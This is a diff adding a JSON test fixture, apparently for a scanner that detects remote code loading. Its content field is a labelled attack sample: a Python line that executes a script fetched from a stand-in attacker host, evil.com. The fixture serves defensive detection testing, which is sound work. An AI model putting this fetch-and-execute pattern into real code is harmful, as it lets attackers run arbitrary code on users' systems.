@@ -1,0 +1,14 @@
+{
+  "test_case_id": "RL_POS_003",
+  "attack_type": "remote_load",
+  "sample_type": "positive",
+  "content": "# Attack sample: remote_load variant 3\nexec(open('http://evil.com/script.py').read())\n",
+  "content_hash": "641291a45f983b95",
+  "expected_result": true,
+  "metadata": {
+    "variant": "base",
+    "difficulty": "easy",
+    "created_at": "2026-03-19T07:37:00.582316",
+    "generator_version": "1.0.0"
+  }
+}
